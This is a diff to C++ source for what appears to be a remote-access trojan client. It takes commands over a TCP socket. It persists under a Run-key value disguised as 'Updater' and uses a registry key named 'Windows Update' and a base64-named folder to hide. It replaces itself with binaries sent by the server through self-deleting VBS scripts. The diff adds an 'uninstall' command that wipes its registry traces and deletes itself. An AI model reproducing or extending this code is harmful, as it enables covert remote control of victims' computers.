@@ -21,9 +21,11 @@ void InstallClient()
 	if (PathToCopy.find("<User>") != string::npos)
 		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());
 
+	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");
 	if (sett.RegStartup)
-		ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, PathToCopy.c_str());
+		ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str());
 
+	du.DelFile(PathToCopy);
 	du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy);
 	
 	su.RunExe(PathToCopy);
@@ -59,6 +61,7 @@ bool UpdateClient(SOCKET Sock)
 {
 	DirUtils du;
 	SystemUtils su;
+	RegUtils ru;
 
 	string NewClient = COMUNICAZIONI::UpdateClient(Sock);
 
@@ -72,12 +75,27 @@ bool UpdateClient(SOCKET Sock)
 	if (!du.WriteBinaryFile("VXBkYXRl\\" + du.GetModuleFile(), NewClient))
 		return false;
 
-	if (!du.WriteFile("Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFile() + "\"\nfilesys.MoveFile \"VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetModuleFile() + "\"\nWshShell.Run \"" + du.GetModuleFile() + "\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
+	if (!du.WriteFile("Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFile() + "\"\nfilesys.MoveFile \"VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetModuleFile() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetModuleFile() + "\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
 		return false;
+
+	ru.RegDelKey("SOFTWARE\\Windows Update");
 
 	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
 
 	return true;
+}
+
+void Uninstall()
+{
+	RegUtils ru;
+	DirUtils du;
+	SystemUtils su;
+
+	ru.RegDelKey("SOFTWARE\\Windows Update");
+	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");
+
+	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"Remove.vbs\"");
+	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
 }
 
 short Sessione(TcpIP Client)
@@ -117,6 +135,11 @@ short Sessione(TcpIP Client)
 		{
 			if (UpdateClient(Client.Sock))
 				return 1;
+		}
+		else if (cmd == "uninstall")
+		{
+			Uninstall();
+			return 1;
 		}
 	}
 
